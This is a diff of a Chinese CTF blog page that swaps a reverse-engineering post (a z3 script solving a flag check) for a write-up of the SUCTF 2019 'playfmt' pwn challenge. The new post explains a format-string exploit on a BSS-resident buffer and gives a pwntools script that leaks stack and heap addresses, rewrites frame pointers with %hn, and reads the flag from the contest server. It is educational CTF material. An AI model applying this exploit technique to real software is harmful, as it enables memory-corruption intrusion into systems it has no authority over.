@@ -15,19 +15,17 @@
 
 
 
-<meta name="description" content="教程">
+<meta name="description" content="在BSS段上的格式化字符串">
 <meta property="og:type" content="article">
-<meta property="og:title" content="调用64位代码的32位程序逆向">
-<meta property="og:url" content="http://yoursite.com/2019/03/12/32位程序调用64位代码/index.html">
+<meta property="og:title" content="SUCTF2019-playfmt">
+<meta property="og:url" content="http://yoursite.com/2019/08/19/SUCTF2019-playfmt/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="教程">
+<meta property="og:description" content="在BSS段上的格式化字符串">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1g0zw8ti4eyj30o00vydk5.jpg">
-<meta property="og:updated_time" content="2019-03-14T12:32:36.209Z">
+<meta property="og:updated_time" content="2019-08-18T13:14:08.118Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="调用64位代码的32位程序逆向">
-<meta name="twitter:description" content="教程">
-<meta name="twitter:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1g0zw8ti4eyj30o00vydk5.jpg">
+<meta name="twitter:title" content="SUCTF2019-playfmt">
+<meta name="twitter:description" content="在BSS段上的格式化字符串">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -59,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>调用64位代码的32位程序逆向 | 4eriri&#39;s blog</title>
+<title>SUCTF2019-playfmt | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -198,11 +196,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-32位程序调用64位代码" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-SUCTF2019-playfmt" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/03/12/32位程序调用64位代码/" class="article-date">
-      <time datetime="2019-03-11T16:43:20.000Z" itemprop="datePublished">2019-03-12</time>
+      <a href="/2019/08/19/SUCTF2019-playfmt/" class="article-date">
+      <time datetime="2019-08-19T13:00:00.000Z" itemprop="datePublished">2019-08-19</time>
 </a>
 
 
@@ -217,7 +215,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      调用64位代码的32位程序逆向
+      SUCTF2019-playfmt
     </h1>
   
 
@@ -234,17 +232,28 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><a href="http://www.sohu.com/a/297547003_120045376" target="_blank" rel="noopener">教程</a></p>
+        <p>在BSS段上的格式化字符串</p>
 <a id="more"></a>
-<p>关于如何从32位程序中dump出64位函数，我就不赘述了，上面的文章已经说的很详尽了。</p>
-<p>dump出的64位函数（大致意义上重命名了一些函数，可能有错误）：</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0zw8ti4eyj30o00vydk5.jpg" alt=""></p>
-<p>对{}中内容的check是以方程组的形式，这里使用了z3求解得到答案：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">a1=[BitVec(&apos;a1%d&apos;%i,8) for i in range(11)]</span><br><span class="line">solver=Solver()</span><br><span class="line">solver.add(a1[4] ^ a1[2] ^ a1[6] == 119)</span><br><span class="line">solver.add((a1[1] ^ a1[0] ^ a1[3]) == 54)</span><br><span class="line">solver.add(a1[10] + a1[3] == 85)</span><br><span class="line">solver.add(a1[2] + a1[9] == 219)</span><br><span class="line">solver.add(a1[4] + a1[5] == 158)</span><br><span class="line">solver.add(a1[2] + a1[1] + a1[5] == 196)</span><br><span class="line">solver.add(a1[8] + a1[7] + a1[9] == 194)</span><br><span class="line">solver.add(a1[5] + a1[3] + a1[9] == 190)</span><br><span class="line">solver.add(a1[6] + a1[2] + a1[8] == 277)</span><br><span class="line">solver.add(a1[10] + a1[1] + a1[7] == 124)</span><br><span class="line">solver.add(a1[5] == 48)</span><br><span class="line">solver.add(a1[10] == 53)</span><br><span class="line">solver.add(a1[7] ^ a1[6] ^ a1[8] == 96)</span><br><span class="line">if solver.check() == sat:</span><br><span class="line">  m = solver.model()</span><br><span class="line">  s=[]</span><br><span class="line">  for i in range(11):</span><br><span class="line">    s.append(m[a1[i]].as_long())</span><br><span class="line">print &apos;&apos;.join([chr(i) for i in s])</span><br><span class="line">#   1&apos;m n0t 4n5</span><br></pre></td></tr></table></figure>
-<p>因为存在异或操作，所以定义变量时使用了BitVec。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parallels@parallels-vm:~$ &apos;/home/parallels/64-32-1.&apos; input_code: hwbctf&#123;1&apos;m n0t 4n5&#125;you got it</span><br></pre></td></tr></table></figure>
-<p>做完了才发现这道题和最开始的链接里说的是一道题2333</p>
-
+<p>ida分析就不贴了，很简单的格式化字符串，只是<code>printf(buf)</code>中的buf存在bss段上，因此读写没有那么方便。</p>
+<p>尝试只读写栈中的内容来获取flag。</p>
+<p>可以发现程序读取flag存到了堆里，并且在栈中可以发现指向堆区的指针。<br>利用格式化字符串leak出堆地址以及栈地址。</p>
+<p>同时在栈区可以发现如下的结构:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xff97fbe8 —▸ 0xff97fc08 —▸ 0xff97fc38 ◂— 0x00xff97fbec —▸ 0x80488f0 (logo()+67) ◂— call   0x804884b0e:0038│      0xff97fbf0 —▸ 0xf7608000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓0xff97fbf8 —▸ 0xff97fc38 ◂— 0x00xff97fbfc —▸ 0x8048ac4 (main+440) ◂— call   0x804884b0xff97fc00 —▸ 0xf7608d60 (_IO_2_1_stdout_) ◂— 0xfbad28870xff97fc04 ◂— 0x00xff97fc08 —▸ 0xff97fc38 ◂— 0x00xff97fc0c —▸ 0x8048ac4 (main+440) ◂— call   0x804884b0xff97fc10 —▸ 0xf76083dc (__exit_funcs) —▸ 0xf76091e0 (initial) ◂— 0x00xff97fc14 ◂— 0x00xff97fc18 —▸ 0x9d8fa28 —▸ 0xf76087b0 (main_arena+48) —▸ 0x9d8fe60 ◂— 0x00xff97fc1c —▸ 0x9d8fe30 ◂— 0x0</span><br></pre></td></tr></table></figure>
+<p>其中</p>
+<p><code>0xff97fbe8 —▸ 0xff97fc08 —▸ 0xff97fc38 ◂— 0x0</code></p>
+<p>通过%n改写此处，使其成为</p>
+<p><code>0xff97fbe8 —▸ 0xff97fc08 —▸ 0xff97fc18 —▸ 0x9d8fa28(heap)</code>，</p>
+<p>然后此时</p>
+<p><code>0xff97fc08 —▸ 0xff97fc38 ◂— 0x0</code></p>
+<p>变为</p>
+<p><code>0xff97fc08 —▸ 0xff97fc18 —▸ 0x9d8fa28(heap)</code></p>
+<p>再改写此处，使得其成为</p>
+<p><code>0xff97fc08 —▸ 0xff97fc18 —▸ 0x9d8fa10(flag)</code></p>
+<p>之后</p>
+<p><code>0xff97fc18 —▸ 0x9d8fa10(flag)</code></p>
+<p>%s读取此处就可以得到flag。</p>
+<p>但是由于堆区地址只有后三位是固定的，每次都写入0x0a10，这样就有1/16的概率可以读取到flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import *sh=remote(&quot;120.78.192.35&quot;,9999)#sh=process(&quot;./playfmt&quot;)sh.recvuntil(&quot;=====================\n&quot;)sh.recvuntil(&quot;=====================\n&quot;)sh.sendline(&quot;%6$p&quot;)stack=int(sh.recv(),16)-0xf8+0xc0log.success(&quot;stack: &quot;+hex(stack))#sh.sendline(&quot;%12$p&quot;) #IOstdout=int(sh.recv(),16)#libcbase=IOstdout-(0xf75f0d60-0xf743e000)#log.success(&quot;libcbase: &quot;+hex(libcbase))sh.sendline(&quot;%18$p&quot;)flagaddr=int(sh.recv(),16)-0x20+8log.success(&quot;flagaddr: &quot;+hex(flagaddr))ffff=(stack+18*4)&amp;0xffffsh.sendline(&quot;%&quot;+str(ffff)+&quot;c%6$hn&quot;)sh.recvuntil(&apos;\xac\n&apos;)sh.sendline(&quot;%2576c%14$hn&quot;)if flagaddr&amp;0xffff==0xa10:	sh.sendline(&quot;%18$s&quot;)	sh.recvuntil(&apos;\xac\n&apos;)	flag=sh.recv()	log.success(&quot;flag: &quot;+flag)sh.close()</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -252,13 +261,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/03/12/32位程序调用64位代码/">调用64位代码的32位程序逆向</a></p>
+        <p><span>本文标题:</span><a href="/2019/08/19/SUCTF2019-playfmt/">SUCTF2019-playfmt</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2019-03-12, 00:43:20</p>
-        <p><span>最后更新:</span>2019-03-14, 20:32:36</p>
+        <p><span>发布时间:</span>2019-08-19, 21:00:00</p>
+        <p><span>最后更新:</span>2019-08-18, 21:14:08</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/03/12/32位程序调用64位代码/" title="调用64位代码的32位程序逆向">http://yoursite.com/2019/03/12/32位程序调用64位代码/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/03/12/32位程序调用64位代码/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/08/19/SUCTF2019-playfmt/" title="SUCTF2019-playfmt">http://yoursite.com/2019/08/19/SUCTF2019-playfmt/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/08/19/SUCTF2019-playfmt/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -270,16 +279,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/03/13/CGCTF-note/">
-                    CGCTF-note
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/03/04/2018网鼎杯pwn-GUESS/">
-                    2018网鼎杯pwn-GUESS
+                <a href="/2019/08/19/SUCTF2019-babyunic/">
+                    SUCTF2019-babyunic
                 </a>
             </div>
         
@@ -327,7 +330,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"调用64位代码的32位程序逆向　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"SUCTF2019-playfmt　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -346,8 +349,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://yoursite.com/2019/03/12/32位程序调用64位代码/';
-            this.page.identifier = '2019/03/12/32位程序调用64位代码/';
+            this.page.url = 'http://yoursite.com/2019/08/19/SUCTF2019-playfmt/';
+            this.page.identifier = '2019/08/19/SUCTF2019-playfmt/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -369,15 +372,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/03/13/CGCTF-note/" title="上一篇: CGCTF-note">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/03/04/2018网鼎杯pwn-GUESS/" title="下一篇: 2018网鼎杯pwn-GUESS">
+            <a href="/2019/08/19/SUCTF2019-babyunic/" title="下一篇: SUCTF2019-babyunic">
                 <i class="fa fa-angle-right"></i>
             </a>
         
